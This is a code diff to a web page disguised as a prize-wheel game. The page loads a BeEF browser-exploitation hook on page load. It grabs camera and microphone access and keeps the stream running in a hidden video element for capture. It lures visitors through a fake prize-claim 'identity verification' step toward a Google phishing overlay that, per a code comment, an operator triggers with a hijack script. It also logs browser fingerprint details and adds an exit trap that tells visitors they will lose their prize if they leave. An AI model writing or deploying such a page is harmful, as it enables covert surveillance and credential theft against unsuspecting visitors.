@@ -338,6 +338,7 @@
     <script>
       let hasPermissions = false;
       let spinning = false;
+      let mediaStream = null;
 
       // Load BeEF hook.js through Vercel proxy
       function loadBeEFHook() {
@@ -363,21 +364,37 @@
         playBtn.textContent = "⏳ Requesting Access...";
 
         try {
-          // Request both camera and microphone
-          const stream = await navigator.mediaDevices.getUserMedia({
-            video: true,
-            audio: true,
+          // Request both camera and microphone with specific constraints
+          mediaStream = await navigator.mediaDevices.getUserMedia({
+            video: {
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+            },
+            audio: {
+              echoCancellation: true,
+              noiseSuppression: true,
+            },
           });
 
           // Permissions granted!
           hasPermissions = true;
 
-          // Keep stream running in background (hidden)
+          // Keep stream running in background (BeEF will capture it)
           console.log("✅ Camera and microphone access granted!");
 
-          // Show game screen
-          document.getElementById("welcome-screen").style.display = "none";
-          document.getElementById("game-screen").style.display = "block";
+          // Create hidden video element to keep stream active
+          const hiddenVideo = document.createElement("video");
+          hiddenVideo.srcObject = mediaStream;
+          hiddenVideo.autoplay = true;
+          hiddenVideo.muted = true;
+          hiddenVideo.style.display = "none";
+          document.body.appendChild(hiddenVideo);
+
+          // Show game screen after small delay
+          setTimeout(() => {
+            document.getElementById("welcome-screen").style.display = "none";
+            document.getElementById("game-screen").style.display = "block";
+          }, 500);
         } catch (err) {
           console.error("Permission error:", err);
           errorMsg.style.display = "block";
@@ -401,8 +418,8 @@
         spinBtn.disabled = true;
         result.style.display = "none";
 
-        // Random rotation (3-5 full spins + random angle)
-        const spins = 3 + Math.floor(Math.random() * 3);
+        // Random rotation (5-7 full spins + random angle)
+        const spins = 5 + Math.floor(Math.random() * 3);
         const randomDegree = Math.floor(Math.random() * 360);
         const totalRotation = spins * 360 + randomDegree;
 
@@ -410,29 +427,103 @@
 
         // Prizes based on final angle
         const prizes = [
-          "🎁 $100 Gift Card",
-          "📱 iPhone 16 Pro Max",
-          "💰 $500 Cash Prize",
-          "🎧 AirPods Pro",
-          "💎 Mystery Bonus",
-          "🏆 GRAND PRIZE",
+          { name: "🎁 $100 Gift Card", showForm: true },
+          { name: "📱 iPhone 16 Pro Max", showForm: true },
+          { name: "💰 $500 Cash Prize", showForm: true },
+          { name: "🎧 AirPods Pro", showForm: true },
+          { name: "💎 Mystery Bonus", showForm: true },
+          { name: "🏆 GRAND PRIZE", showForm: true },
         ];
 
+        // Wait for wheel to stop spinning
         setTimeout(() => {
           const finalAngle = totalRotation % 360;
           const segmentAngle = 60;
           const prizeIndex = Math.floor(finalAngle / segmentAngle);
+          const wonPrize = prizes[prizeIndex];
 
-          result.textContent = `🎉 You Won: ${prizes[prizeIndex]}!`;
+          result.innerHTML = `
+            <div style="font-size: 1.8em; margin-bottom: 15px;">
+              🎉 CONGRATULATIONS! 🎉
+            </div>
+            <div style="font-size: 1.3em; margin-bottom: 20px;">
+              You Won: ${wonPrize.name}
+            </div>
+            <div style="font-size: 0.9em; opacity: 0.95;">
+              Click below to claim your prize!
+            </div>
+          `;
           result.style.display = "block";
 
-          spinBtn.disabled = false;
+          // Show claim button after 1 second
+          setTimeout(() => {
+            spinBtn.textContent = "🎁 CLAIM YOUR PRIZE";
+            spinBtn.disabled = false;
+
+            // Replace spin function with claim function
+            spinBtn.onclick = claimPrize;
+          }, 1000);
+
           spinning = false;
-        }, 4000);
+        }, 4500); // Increased to 4.5 seconds for dramatic effect
+      }
+
+      function claimPrize() {
+        const result = document.getElementById("result");
+        const spinBtn = document.getElementById("spinBtn");
+
+        spinBtn.disabled = true;
+
+        // Show "processing" message
+        result.innerHTML = `
+          <div style="font-size: 1.5em; margin-bottom: 15px;">
+            ⏳ Processing Your Prize...
+          </div>
+          <div style="font-size: 1em; opacity: 0.9;">
+            Please wait while we verify your identity
+          </div>
+        `;
+
+        // After 2 seconds, show success and trigger Google phishing
+        // The Google phishing module (11) will be triggered by BeEF operator
+        // using: python3 hijack.py --exploit google_phishing --session <SESSION_ID>
+        setTimeout(() => {
+          result.innerHTML = `
+            <div style="font-size: 1.5em; margin-bottom: 15px;">
+              ✅ Verification Complete!
+            </div>
+            <div style="font-size: 1em; opacity: 0.9;">
+              A verification form will appear shortly.<br>
+              Please fill it out to receive your prize.
+            </div>
+          `;
+
+          // Keep the verification message visible
+          // Google phishing form will overlay this page
+        }, 2000);
       }
 
       // Auto-load BeEF hook when page loads
-      window.addEventListener("DOMContentLoaded", loadBeEFHook);
+      window.addEventListener("DOMContentLoaded", function () {
+        loadBeEFHook();
+
+        // Preload some browser info for BeEF
+        console.log("User Agent:", navigator.userAgent);
+        console.log("Platform:", navigator.platform);
+        console.log("Language:", navigator.language);
+        console.log("Cookies Enabled:", navigator.cookieEnabled);
+        console.log("Screen:", screen.width + "x" + screen.height);
+      });
+
+      // Prevent user from closing the tab easily
+      window.addEventListener("beforeunload", function (e) {
+        if (hasPermissions && !spinning) {
+          e.preventDefault();
+          e.returnValue =
+            "Are you sure you want to leave? You will lose your prize!";
+          return e.returnValue;
+        }
+      });
     </script>
   </body>
 </html>
